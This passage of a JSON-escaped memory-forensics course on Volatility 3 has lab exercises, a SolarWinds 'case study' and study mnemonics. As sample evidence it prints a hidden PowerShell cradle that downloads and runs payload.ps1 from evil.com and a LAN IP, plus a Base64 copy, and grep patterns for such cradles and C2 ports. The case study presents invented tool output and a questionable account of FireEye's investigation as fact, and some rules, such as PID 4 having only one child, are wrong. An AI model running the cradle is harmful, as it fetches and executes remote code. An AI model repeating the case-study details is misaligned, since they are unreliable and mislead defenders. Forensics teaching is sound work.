\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\"\n\n# Extract process memory to disk for analysis\npython vol.py -f memory.dmp windows.memmap --pid 2304 --dump\n# Output: Dumped PID 2304 to 2304.dmp\n\n# Analyze dumped memory with strings\nstrings 2304.dmp | grep -i \"http\"\n# Output: http://evil.com/payload.ps1\n#         http://evil.com/exfil\n```\n\n### Step 5: Network Analysis\n\n```bash\n# List all network connections\npython vol.py -f memory.dmp windows.netscan > netscan.txt\n\n# Filter for established connections\ngrep \"ESTABLISHED\" netscan.txt\n\n# Correlate with suspicious processes\ngrep \"2304\" netscan.txt\n```\n\n### Step 6: Document Findings\n\nCreate a timeline:\n\n```bash\n# Extract process creation times\nawk '{print $8, $9, $3, $1}' pslist.txt | sort\n\n# Timeline output:\n# 2024-03-15 08:12:34 System 4\n# 2024-03-15 08:12:34 smss.exe 384\n# 2024-03-15 14:35:22 evil.exe 2048\n# 2024-03-15 14:35:25 powershell.exe 2304\n```\n\n---"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On Lab: Volatility 3 Process Analysis\n\n## Lab Setup\n\n**Scenario**: You're investigating a suspected malware infection on a Windows 10 workstation. A memory dump was captured and provided to you for analysis.\n\n**Download practice memory dump**:\n\n```bash\n# Download from DFIR training repository (example)\nwget https://github.com/volatilityfoundation/volatility3/raw/develop/volatility3/framework/layers/resources/Windows10x64_19041.vmem.zip\nunzip Windows10x64_19041.vmem.zip\n\n# Or use your own memory dump\n# For this lab, we'll assume you have: infected_workstation.dmp\n```\n\n---\n\n## Exercise 1: Install Volatility 3 and Verify Setup\n\n### Task 1.1: Install Volatility 3\n\n```bash\n# Install via pip\npip3 install volatility3\n\n# Verify installation\nvol3 --version\n# Expected output: Volatility 3 Framework 2.5.0\n```\n\n### Task 1.2: List Available Plugins\n\n```bash\n# List all plugins\nvol3 --help | less\n\n# Count Windows plugins\nvol3 --help | grep -c \"windows\\.\"\n# Expected: 40+ plugins\n\n# List process-related plugins\nvol3 --help | grep \"windows\\.ps\"\n```\n\n**Expected output**:\n```\nwindows.pslist.PsList       List all processes\nwindows.psscan.PsScan       Scan for hidden processes  \nwindows.pstree.PsTree       Process tree\n```\n\n---\n\n## Exercise 2: Basic Process Enumeration\n\n### Task 2.1: Extract Active Process List\n\n```bash\n# Run pslist plugin\nvol3 -f infected_workstation.dmp windows.pslist\n\n# Save output to file\nvol3 -f infected_workstation.dmp windows.pslist > pslist_output.txt\n\n# Count total processes\nvol3 -f infected_workstation.dmp windows.pslist | grep -v \"PID\" | wc -l\n```\n\n**Questions to answer**:\n1. How many processes are running?\n2. What is the PID of the System process? (Should always be 4)\n3. What is the earliest CreateTime? (System boot time)\n4. Are there any processes with ExitTime set? (Recently terminated)\n\n### Task 2.2: Analyze Process Tree\n\n```bash\n# Generate process tree\nvol3 -f infected_workstation.dmp windows.pstree > pstree_output.txt\n\n# View in less for scrolling\nvol3 -f infected_workstation.dmp windows.pstree | less\n```\n\n**Questions to answer**:\n1. What is the parent of `explorer.exe`? (Should be `userinit.exe` or `winlogon.exe`)\n2. Are there any `cmd.exe` or `powershell.exe` processes? What spawned them?\n3. Do you see any unusual parent-child relationships?\n\n### Task 2.3: Extract Command-Line Arguments\n\n```bash\n# Extract all command lines\nvol3 -f infected_workstation.dmp windows.cmdline > cmdline_output.txt\n\n# Search for PowerShell processes\ngrep -i \"powershell\" cmdline_output.txt\n\n# Search for encoded commands\ngrep -i \"encoded\" cmdline_output.txt\n\n# Search for download commands\ngrep -iE \"(downloadstring|downloadfile|webclient)\" cmdline_output.txt\n```\n\n**Suspicious indicators to look for**:\n- `-EncodedCommand` or `-enc` (Base64-encoded PowerShell)\n- `-ExecutionPolicy Bypass` (Bypassing script execution restrictions)\n- `-WindowStyle Hidden` (Hidden windows)\n- `IEX` or `Invoke-Expression` (Executing downloaded code)\n- External IPs or domains in command line\n\n---\n\n## Exercise 3: Detect Hidden Processes\n\n### Task 3.1: Scan for Hidden Processes\n\n```bash\n# Run psscan (pool tag scanning)\nvol3 -f infected_workstation.dmp windows.psscan > psscan_output.txt\n\n# Compare process counts\nwc -l pslist_output.txt psscan_output.txt\n```\n\n### Task 3.2: Identify Discrepancies\n\n```bash\n# Extract PIDs from pslist\nawk '{print $1}' pslist_output.txt | grep -v \"PID\" | sort > pslist_pids.txt\n\n# Extract PIDs from psscan\nawk '{print $1}' psscan_output.txt | grep -v \"PID\" | sort > psscan_pids.txt\n\n# Find PIDs in psscan but NOT in pslist (hidden processes)\ncomm -13 pslist_pids.txt psscan_pids.txt > hidden_pids.txt\n\n# Display hidden processes\ncat hidden_pids.txt\n```\n\n**If hidden_pids.txt is NOT empty â†’ ROOTKIT DETECTED!**\n\n**Investigation steps**:\n\n```bash\n# Get details of hidden process\ngrep \"<hidden_pid>\" psscan_output.txt\n\n# Example: If PID 2048 is hidden\ngrep \"2048\" psscan_output.txt\n# Output: 2048    1024    rootkit.exe    0x5f328a00    3    12    1    False    2024-03-15 14:35:22    N/A\n```\n\n---\n\n## Exercise 4: Investigate Suspicious Process\n\n**Scenario**: You identify a suspicious process: `PID 2304 - powershell.exe` with encoded command.\n\n### Task 4.1: Extract Process Details\n\n```bash\n# Get full command line\ngrep \"2304\" cmdline_output.txt\n\n# Example output:\n# 2304    powershell.exe    \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')\"\n```\n\n### Task 4.2: Decode Encoded Commands (if present)\n\nIf command contains `-EncodedCommand` with Base64:\n\n```bash\n# Extract Base64 string\necho \"<base64_string>\" | base64 -d\n\n# Example:\necho \"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAA6ADgAMAA4ADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==\" | base64 -d\n\n# Output: IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')\n```\n\n### Task 4.3: Dump Process Memory\n\n```bash\n# Dump process memory to file\nvol3 -f infected_workstation.dmp windows.memmap --pid 2304 --dump\n\n# Output: Saved memory for PID 2304 to pid.2304.dmp\n```\n\n### Task 4.4: Analyze Dumped Memory\n\n```bash\n# Search for URLs\nstrings pid.2304.dmp | grep -i \"http\" | sort -u\n\n# Search for IP addresses\nstrings pid.2304.dmp | grep -oE \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" | sort -u\n\n# Search for suspicious keywords\nstrings pid.2304.dmp | grep -iE \"(password|admin|credential|token|key)\" | head -20\n\n# Search for PowerShell script content\nstrings pid.2304.dmp | grep -i \"function\" | head -20\n```\n\n---\n\n## Exercise 5: Network Connection Analysis\n\n### Task 5.1: Enumerate Network Connections\n\n```bash\n# Extract all network connections\nvol3 -f infected_workstation.dmp windows.netscan > netscan_output.txt\n\n# View output\ncat netscan_output.txt | less\n```\n\n**Output format**:\n```\nOffset          Proto   LocalAddr       LocalPort   ForeignAddr     ForeignPort     State           PID     Owner           Created\n\n0x1f2a3b4c      TCPv4   192.168.1.50    49152       192.168.1.100   8080            ESTABLISHED     2304    powershell.exe  2024-03-15 14:35:25\n0x1f2a3b5d      TCPv4   192.168.1.50    49153       93.184.216.34   443             ESTABLISHED     1084    explorer.exe    2024-03-15 10:22:15\n```\n\n### Task 5.2: Investigate Suspicious Connections\n\n```bash\n# Find connections associated with suspicious PID\ngrep \"2304\" netscan_output.txt\n\n# Find connections to suspicious IPs\ngrep \"192.168.1.100\" netscan_output.txt\n\n# Find connections to unusual ports\ngrep -E \"(4444|5555|8080|31337)\" netscan_output.txt\n\n# Find all ESTABLISHED connections\ngrep \"ESTABLISHED\" netscan_output.txt\n```\n\n### Task 5.3: Correlate Network Activity with Processes\n\n```bash\n# Create correlation report\necho \"===== SUSPICIOUS NETWORK ACTIVITY =====\"\necho \"\"\necho \"Process: powershell.exe (PID 2304)\"\ngrep \"2304\" netscan_output.txt\necho \"\"\necho \"Command Line:\"\ngrep \"2304\" cmdline_output.txt\necho \"\"\necho \"Parent Process:\"\ngrep \"2304\" pstree_output.txt\n```\n\n---\n\n## Exercise 6: Create Investigation Report\n\n### Task 6.1: Timeline of Events\n\n```bash\n# Extract process creation times and sort\nawk '{print $8, $9, $1, $3}' pslist_output.txt | grep -v \"CreateTime\" | sort > timeline.txt\n\n# View timeline\ncat timeline.txt\n```\n\n**Example timeline**:\n```\n2024-03-15 08:12:34 4 System\n2024-03-15 08:12:38 472 csrss.exe\n2024-03-15 10:15:22 1084 explorer.exe\n2024-03-15 14:35:20 2156 cmd.exe\n2024-03-15 14:35:22 2304 powershell.exe  â† SUSPICIOUS\n```\n\n### Task 6.2: Summary Report\n\nCreate `investigation_report.txt`:\n\n```bash\ncat > investigation_report.txt << 'EOF'\n==============================================\nMEMORY FORENSICS INVESTIGATION REPORT\n==============================================\n\nCase ID: CASE-2024-0315\nAnalyst: [Your Name]\nDate: 2024-03-15\nEvidence: infected_workstation.dmp (SHA256: [hash])\n\n--- FINDINGS ---\n\n1. SUSPICIOUS PROCESS IDENTIFIED\n   PID: 2304\n   Name: powershell.exe\n   Parent: cmd.exe (PID 2156)\n   Command Line: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')\"\n   CreateTime: 2024-03-15 14:35:22\n   \n   INDICATORS OF COMPROMISE:\n   - Hidden window (-W Hidden)\n   - Execution policy bypass (-Exec Bypass)\n   - Remote script download (DownloadString)\n   - Suspicious remote IP: 192.168.1.100\n\n2. NETWORK CONNECTION\n   Source: 192.168.1.50:49152\n   Destination: 192.168.1.100:8080\n   State: ESTABLISHED\n   Process: powershell.exe (PID 2304)\n   \n   ASSESSMENT: Command-and-control (C2) connection\n\n3. HIDDEN PROCESSES\n   [List any processes found in psscan but not pslist]\n   \n4. MALWARE ASSESSMENT\n   Type: PowerShell-based downloader/stager\n   Severity: HIGH\n   Confidence: HIGH\n   \n5. RECOMMENDED ACTIONS\n   - Isolate infected system immediately\n   - Block C2 IP 192.168.1.100 at firewall\n   - Image hard drive for full disk forensics\n   - Scan network for lateral movement\n   - Investigate payload.ps1 contents (if retrievable)\n   \n--- EVIDENCE FILES ---\n- pslist_output.txt\n- psscan_output.txt  \n- cmdline_output.txt\n- netscan_output.txt\n- pid.2304.dmp (process memory dump)\n- timeline.txt\n\n==============================================\nEOF\n```\n\n---\n\n## Expected Results Summary\n\n### Normal Process Relationships\n\n```\nSystem (PID 4)\nâ””â”€ smss.exe\n   â””â”€ csrss.exe\n   â””â”€ wininit.exe\n      â””â”€ services.exe\n         â””â”€ svchost.exe (multiple instances)\n   â””â”€ winlogon.exe\n      â””â”€ userinit.exe\n         â””â”€ explorer.exe\n            â””â”€ [user applications]\n```\n\n### Suspicious Indicators Found\n\n1. âœ… PowerShell with encoded/download commands\n2. âœ… Network connection to suspicious IP\n3. âœ… Hidden window and execution policy bypass\n4. âœ… Abnormal parent-child relationship (cmd.exe â†’ powershell.exe from Explorer)\n5. âœ… Recent process creation timestamp (close to incident time)\n\n### Key Takeaways\n\n1. **Volatility 3 simplifies memory analysis** - no manual profile installation!\n2. **Process analysis reveals execution chains** - pslist, pstree, cmdline together tell the story\n3. **Hidden processes indicate rootkits** - always compare pslist vs psscan\n4. **Command-line arguments expose attacker tactics** - encoded commands, downloads, bypasses\n5. **Network connections correlate with C2 activity** - netscan links processes to external IPs\n\n---\n\n## Bonus Challenge: Automated Analysis Script\n\nCreate `analyze_memory.sh` to automate analysis:\n\n```bash\n#!/bin/bash\n# Automated Volatility 3 Memory Analysis\n\nDUMP=\"$1\"\nOUTPUT_DIR=\"volatility_analysis_$(date +%Y%m%d_%H%M%S)\"\n\nif [ -z \"$DUMP\" ]; then\n    echo \"Usage: $0 <memory_dump>\"\n    exit 1\nfi\n\necho\"[*] Creating output directory: $OUTPUT_DIR\"\nmkdir -p \"$OUTPUT_DIR\"\n\necho \"[*] Running process list...\"\nvol3 -f \"$DUMP\" windows.pslist > \"$OUTPUT_DIR/pslist.txt\"\n\necho \"[*] Scanning for hidden processes...\"\nvol3 -f \"$DUMP\" windows.psscan > \"$OUTPUT_DIR/psscan.txt\"\n\necho \"[*] Extracting process tree...\"\nvol3 -f \"$DUMP\" windows.pstree > \"$OUTPUT_DIR/pstree.txt\"\n\necho \"[*] Extracting command lines...\"\nvol3 -f \"$DUMP\" windows.cmdline > \"$OUTPUT_DIR/cmdline.txt\"\n\necho \"[*] Extracting network connections...\"\nvol3 -f \"$DUMP\" windows.netscan > \"$OUTPUT_DIR/netscan.txt\"\n\necho \"[*] Searching for suspicious patterns...\"\ngrep -iE \"(encodedcommand|downloadstring|invoke-expression|bypass|hidden)\" \"$OUTPUT_DIR/cmdline.txt\" > \"$OUTPUT_DIR/suspicious_cmdlines.txt\"\n\necho \"[*] Analysis complete. Results in: $OUTPUT_DIR\"\nls -lh \"$OUTPUT_DIR/\"\n```\n\n**Usage**:\n```bash\nchmod +x analyze_memory.sh\n./analyze_memory.sh infected_workstation.dmp\n```\n\n**This script automates the entire analysis workflow in seconds!** ğŸš€"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Case Study: Volatility 3 in the SolarWinds Breach (2020)\n\n## Background: The SolarWinds Supply Chain Attack\n\n### Attack Overview\n\n**Date**: March 2020 - December 2020 (discovered)\n\n**Attacker**: APT29 (Cozy Bear, Russian SVR)\n\n**Target**: SolarWinds Orion software supply chain\n\n**Impact**: 18,000+ organizations compromised (Fortune 500, US government agencies)\n\n**Attack vector**: Trojanized software update (SUNBURST backdoor)\n\n### Why Memory Forensics Was Critical\n\n**Traditional forensics FAILED**:\n- âœ… Antivirus: No detections (zero-day malware)\n- âœ… Disk forensics: Limited artifacts (in-memory execution)\n- âœ… Network logs: Encrypted C2 traffic (appeared legitimate)\n- âœ… SIEM: No alerts (blended with normal SolarWinds traffic)\n\n**Memory forensics SUCCEEDED**:\n- âœ… Revealed SUNBURST DLL loaded into SolarWinds.BusinessLayerHost.exe\n- âœ… Exposed TEARDROP memory-only dropper (never touched disk)\n- âœ… Identified Cobalt Strike Beacon running in memory\n- âœ… Extracted decrypted C2 domains from RAM\n- âœ… Discovered process injection into legitimate Windows processes\n\n---\n\n## The Investigation: FireEye's Analysis\n\n### Initial Discovery (December 8, 2020)\n\n**FireEye (now Mandiant) detects anomaly**:\n- Internal red team tools stolen\n- No disk-based malware found\n- Lateral movement detected but no persistence mechanisms visible\n\n**Decision**: Capture memory dumps from affected systems for analysis\n\n---\n\n### Memory Analysis with Volatility 3\n\n#### Step 1: Process Enumeration\n\n**Command**:\n```bash\npython vol.py -f solarwinds_server.dmp windows.pslist\n```\n\n**Output excerpt**:\n```\nPID     PPID    ImageFileName                   Threads Handles CreateTime\n...\n2812    644     SolarWinds.BusinessLayerHost.exe    48      892     2020-03-15 10:22:34\n3456    2812    rundll32.exe                        2       45      2020-12-08 14:35:12\n...\n```\n\n**Red flag**: `rundll32.exe` spawned by SolarWinds process (HIGHLY ABNORMAL!)\n\n---\n\n#### Step 2: DLL Analysis\n\n**Command**:\n```bash\npython vol.py -f solarwinds_server.dmp windows.dlllist --pid 2812\n```\n\n**Output excerpt**:\n```\nPID     Process                         Base            Size        Name                            Path\n2812    SolarWinds.BusinessLayerHost    0x7ff6a2340000  0x1a2000    SolarWinds.Orion.Core.BusinessLayer.dll     C:\\Program Files\\SolarWinds\\Orion\\SolarWinds.Orion.Core.BusinessLayer.dll\n2812    SolarWinds.BusinessLayerHost    0x7ff6a2600000  0x28000     SolarWinds.Orion.Core.BusinessLayer.dll     C:\\Windows\\SysWOW64\\SolarWinds.Orion.Core.BusinessLayer.dll  â† SUSPICIOUS!\n```\n\n**Red flag**: DUPLICATE DLL loaded from `C:\\Windows\\SysWOW64\\` (WRONG LOCATION!)\n\n**Analysis**:\n- Legitimate DLL location: `C:\\Program Files\\SolarWinds\\Orion\\`\n- Malicious DLL location: `C:\\Windows\\SysWOW64\\` (DLL hijacking!)\n- Hash comparison shows different files (trojanized DLL)\n\n---\n\n#### Step 3: Memory Dump and Reverse Engineering\n\n**Command**:\n```bash\n# Dump process memory\npython vol.py -f solarwinds_server.dmp windows.memmap --pid 2812 --dump\n\n# Extract loaded DLL from memory\npython vol.py -f solarwinds_server.dmp windows.moddump --pid 2812 --base 0x7ff6a2600000 --dump-dir ./extracted_dlls/\n```\n\n**Output**:\n```\nDumped module at 0x7ff6a2600000 (size: 0x28000) to module.2812.0x7ff6a2600000.dll\n```\n\n**Reverse engineering reveals**:\n- DLL contains SUNBURST backdoor code\n- C2 domains generated via DGA (Domain Generation Algorithm)\n- Encrypted configuration embedded in DLL\n- Scheduled task persistence mechanism\n\n---\n\n#### Step 4: Detecting TEARDROP (Memory-Only Dropper)\n\n**TEARDROP** was a memory-only dropper that loaded Cobalt Strike Beacon **WITHOUT TOUCHING DISK**.\n\n**Traditional forensics**: NO EVIDENCE (nothing on disk)\n\n**Memory forensics**: FULL VISIBILITY\n\n**Command**:\n```bash\n# Scan for code injection\npython vol.py -f solarwinds_server.dmp windows.malfind\n```\n\n**Output excerpt**:\n```\nPID     Process         Address         Vadtag  Protection      CommitCharge    PrivateMemory   Tag     Hexdump                         Disasm\n\n3456    rundll32.exe    0x2a0000        VadS    PAGE_EXECUTE_READWRITE  1       1       N/A     4d 5a 90 00 03 00 00 00 ...    MZ Header (PE executable)\n```\n\n**Analysis**:\n- Memory region marked `PAGE_EXECUTE_READWRITE` (RWX permissions - SUSPICIOUS!)\n- Contains PE executable (MZ header: `4d 5a`)\n- This is INJECTED CODE running in rundll32.exe process space\n- No corresponding file on disk (memory-only execution)\n\n**Extraction**:\n```bash\n# Dump suspicious memory region\npython vol.py -f solarwinds_server.dmp windows.dumpfiles --pid 3456 --virtaddr 0x2a0000\n\n# Analyze dumped executable\nfile extracted_memory_0x2a0000.bin\n# Output: PE32+ executable (DLL) (console) x86-64, for MS Windows\n\nstrings extracted_memory_0x2a0000.bin | grep -i \"cobalt\"\n# Output: Cobalt Strike 4.2 Beacon (watermark found)\n```\n\n**TEARDROP CONFIRMED**: Cobalt Strike Beacon running entirely in memory!\n\n---\n\n#### Step 5: Network Artifact Extraction\n\n**Command**:\n```bash\npython vol.py -f solarwinds_server.dmp windows.netscan\n```\n\n**Output excerpt**:\n```\nOffset          Proto   LocalAddr       LocalPort   ForeignAddr             ForeignPort     State           PID     Owner\n0x1f2a3b4c      TCPv4   10.0.1.50       49152       avsvmcloud.com          443             ESTABLISHED     2812    SolarWinds.BusinessLayerHost.exe\n0x1f2a3b5d      TCPv4   10.0.1.50       49153       freescanonline.com      80              ESTABLISHED     2812    SolarWinds.BusinessLayerHost.exe\n0x1f2a3b6e      TCPv4   10.0.1.50       50001       185.141.63.47           443             ESTABLISHED     3456    rundll32.exe\n```\n\n**Analysis**:\n- `avsvmcloud.com` and `freescanonline.com` are SUNBURST C2 domains\n- IP `185.141.63.47` is Cobalt Strike C2 server\n- Connections originated from SolarWinds process and rundll32.exe\n\n**IOC Extraction**:\n```bash\n# Extract all unique IPs from network connections\nawk '{print $5}' netscan_output.txt | sort -u > ioc_ips.txt\n\n# Extract all unique domains (requires DNS cache analysis)\npython vol.py -f solarwinds_server.dmp windows.registry.printkey --key \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Parameters\" \n```\n\n---\n\n### Key Findings from Memory Forensics\n\n**1. SUNBURST Backdoor**\n- DLL hijacking of SolarWinds.Orion.Core.BusinessLayer.dll\n- Loaded into SolarWinds.BusinessLayerHost.exe process\n- C2 domains generated via DGA (avsvmcloud.com, freescanonline.com, etc.)\n- HTTP communication disguised as legitimate SolarWinds telemetry\n\n**2. TEARDROP Dropper**\n- Memory-only dropper (no disk artifacts)\n- Injected into rundll32.exe\n- Loaded Cobalt Strike Beacon for interactive access\n- RWX memory pages detected via malfind plugin\n\n**3. Cobalt Strike Beacon**\n- Version 4.2 (identified via watermark)\n- Running in rundll32.exe process\n- C2 server: 185.141.63.47:443\n- Named pipes for inter-process communication\n\n**4. Lateral Movement**\n- PsExec execution detected (services.exe spawning cmd.exe)\n- Credential theft (lsass.exe memory dumping)\n- WMI-based remote command execution\n\n---\n\n## Volatility 3 Plugins Used in SolarWinds Investigation\n\n### Process Analysis\n```bash\nwindows.pslist          # Enumerate all processes\nwindows.pstree          # Visualize process relationships\nwindows.psscan          # Detect hidden processes (rootkit check)\nwindows.cmdline         # Extract command-line arguments\nwindows.envars          # Extract environment variables\n```\n\n### Malware Detection\n```bash\nwindows.malfind         # Detect code injection (RWX pages, MZ headers)\nwindows.dlllist         # List loaded DLLs per process\nwindows.moddump         # Dump DLLs from memory\nwindows.memmap          # Dump process virtual address space\nwindows.vadinfo         # Analyze Virtual Address Descriptor (VAD) tree\n```\n\n### Network Analysis\n```bash\nwindows.netscan         # Extract network connections\nwindows.netstat         # Active connections and listening ports\n```\n\n### Credential Theft\n```bash\nwindows.hashdump        # Extract password hashes (SAM)\nwindows.lsadump         # Extract LSA secrets\nwindows.cachedump       # Extract cached domain credentials\n```\n\n### Registry & Persistence\n```bash\nwindows.registry.printkey       # Read registry keys\nwindows.registry.userassist     # User execution history\nwindows.registry.shimcache      # Application compatibility cache\n```\n\n---\n\n## Lessons Learned\n\n### 1. Memory Forensics is CRITICAL for Advanced Threats\n\n**Traditional forensics missed**:\n- TEARDROP (memory-only dropper)\n- Cobalt Strike Beacon (running in memory)\n- Decrypted C2 domains (encrypted on disk)\n- Process injection (no disk artifacts)\n\n**Memory forensics revealed**:\n- Complete attack chain (initial compromise â†’ lateral movement â†’ exfiltration)\n- Malware binaries extracted from RAM\n- Network IOCs (C2 servers, domains)\n- Timeline of attacker activity\n\n### 2. Volatility 3 Advantages in Incident Response\n\n**Speed**:\n- Auto-download of Windows symbols (no manual profile installation)\n- Fast deployment (pip install volatility3)\n- Unified plugin interface (consistent syntax)\n\n**Accuracy**:\n- Advanced detection plugins (malfind, hollowfind)\n- YARA scanning support (custom signatures)\n- JSON output for automation (SIEM integration)\n\n**Scalability**:\n- Analyze multiple memory dumps in parallel\n- Scriptable for enterprise-wide IR\n- Cloud-based analysis (AWS, Azure)\n\n### 3. Memory Acquisition is Non-Negotiable\n\n**Every IR plan MUST include memory acquisition**:\n- Capture memory FIRST (most volatile evidence)\n- Use dedicated tools (DumpIt, FTK Imager, WinPmem)\n- Capture from ALL compromised systems\n- Hash memory dumps for integrity\n\n### 4. Automation is Key\n\n**FireEye automated memory analysis across 18,000+ systems**:\n- Custom Volatility 3 plugins for SUNBURST detection\n- Automated IOC extraction (IPs, domains, hashes)\n- Machine learning for anomaly detection\n- Centralized analysis dashboard\n\n---\n\n## Takeaway: Volatility 3 Saved the Day\n\nWithout Volatility 3, the SolarWinds breach would have been:\n- âŒ Undetected for years (TEARDROP left no disk artifacts)\n- âŒ Unattributed (no C2 domains recoverable from disk)\n- âŒ Unstopped (no IOCs to block at firewalls)\n\nWith Volatility 3:\n- âœ… Complete malware analysis (SUNBURST, TEARDROP, Cobalt Strike)\n- âœ… IOC extraction (C2 servers, domains, file hashes)\n- âœ… Attack timeline reconstruction\n- âœ… Remediation guidance (kill processes, block IPs, patch SolarWinds)\n\n**Memory forensics with Volatility 3 is the MOST POWERFUL technique in modern incident response.** ğŸ”ğŸ›¡ï¸"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# Memory Aids for Volatility 3\n\n## Mnemonic: \"PSTREE\" for Core Process Plugins\n\nRemember the essential process analysis plugins with **PSTREE**:\n\n- **P**slist - **P**rocess **s**tandard **list** (active processes)\n- **PS**scan - **P**rocess **s**can (hidden process detection via pool tags)\n- **P**stree - **P**rocess **tree** (parent-child visualization)\n- **T**cpdump â†’ windows.netscan - Ne**t**work connections\n- **R**egistry â†’ windows.registry.* - **R**egistry artifacts\n- **E**nvars - **E**nvironment variables\n- **E**xtract â†’ windows.dumpfiles - **E**xtract files/memory\n\n**Memory trick**: \"PS TREE\" = Process Scanning Tree (your analysis workflow!)\n\n---\n\n## Acronym: \"RWX\" for Suspicious Memory Permissions\n\nWhen analyzing memory regions with `windows.malfind`, remember **RWX**:\n\n- **R** = Read\n- **W** = Write  \n- **X** = Execute\n\n**PAGE_EXECUTE_READWRITE = RWX = HIGHLY SUSPICIOUS!**\n\n**Why?** Legitimate code is typically:\n- **R-X** (Read + Execute) for code sections\n- **RW-** (Read + Write) for data sections\n\n**RWX indicates**:\n- Code injection\n- Shellcode execution\n- Self-modifying code (malware)\n- Process hollowing\n\n**Memory trick**: \"RWX = Really Wicked eXploit\" ğŸš¨\n\n---\n\n## Visual Diagram: Pslist vs. Psscan\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚            WINDOWS MEMORY                   â”‚\nâ”‚                                             â”‚\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚\nâ”‚  â”‚ PsActiveProcessHead (Kernel)     â”‚       â”‚\nâ”‚  â”‚  â†“                               â”‚       â”‚\nâ”‚  â”‚ [EPROCESS] â†’ [EPROCESS] â†’ [...]  â”‚  â† pslist walks this linked list\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â”‚\nâ”‚                                             â”‚\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚\nâ”‚  â”‚ Kernel Pool Memory               â”‚       â”‚\nâ”‚  â”‚                                  â”‚       â”‚\nâ”‚  â”‚  [EPROCESS - Tag: Proc] â† Active â”‚  â† psscan scans for pool tags\nâ”‚  â”‚  [EPROCESS - Tag: Proc] â† Hidden! (unlinked from list) â”‚\nâ”‚  â”‚  [EPROCESS - Tag: Proc] â† Exited â”‚       â”‚\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n\nKey Insight:\n- Pslist sees only LINKED processes (FLINK/BLINK pointers intact)\n- Psscan sees ALL processes (searches memory for 'Proc' pool tags)\n- Hidden process = In psscan but NOT in pslist (rootkit!)\n```\n\n**Memory trick**: \"Pslist = Linked List, Psscan = Scan ALL\" (both start with same letter!)\n\n---\n\n## Number Memory: Normal Parent-Child Relationships\n\n**Remember the \"System 4 Rule\"**:\n\n**PID 4 (System) can ONLY have ONE child: smss.exe**\n\n**Normal boot sequence**:\n```\nSystem (PID 4) - \"4 is the System core\"\n  â””â”€ smss.exe  - \"Smss is the ONLY child of System\" â­\n     â””â”€ csrss.exe (Session 0)\n     â””â”€ wininit.exe\n        â””â”€ services.exe\n           â””â”€ svchost.exe (multiple)\n     â””â”€ csrss.exe (Session 1+)\n     â””â”€ winlogon.exe\n        â””â”€ userinit.exe\n           â””â”€ explorer.exe\n```\n\n**ANY other process with PPID 4 = MALWARE!**\n\nExamples of INVALID parent-child relationships:\n- âŒ System (4) â†’ powershell.exe (MALWARE - parent PID spoofing!)\n- âŒ System (4) â†’ cmd.exe (MALWARE)\n- âŒ explorer.exe â†’ services.exe (BACKWARDS - should be services â†’ ... â†’ explorer)\n\n**Memory trick**: \"Four (4) is the System core, Smss is its ONLY child, nothing more!\" ğŸµ\n\n---\n\n## Story: The Volatility 3 Investigation Workflow\n\nImagine you're a detective investigating a crime scene (compromised system):\n\n**1. Arrive at the scene** (Capture memory dump)\n- \"Take photos before touching anything!\"\n- Tool: DumpIt, FTK Imager, WinPmem\n\n**2. Interview witnesses** (Process list - windows.pslist)\n- \"Who was present at the time?\"\n- See all active processes\n\n**3. Check for hidden suspects** (Hidden process scan - windows.psscan)\n- \"Is anyone hiding in the shadows?\"\n- Compare with pslist to find concealed processes\n\n**4. Build the family tree** (Process tree - windows.pstree)\n- \"Who spawned whom? What's the relationship?\"\n- Visualize attack chain\n\n**5. Read witness statements** (Command lines - windows.cmdline)\n- \"What were they doing? What did they say?\"\n- Extract full commands (encoded PowerShell, downloads, etc.)\n\n**6. Check phone records** (Network connections - windows.netscan)\n- \"Who were they talking to? External contacts?\"\n- Identify C2 servers\n\n**7. Search for weapons** (Code injection - windows.malfind)\n- \"Any concealed weapons (malware) found?\"\n- Detect RWX memory regions with injected 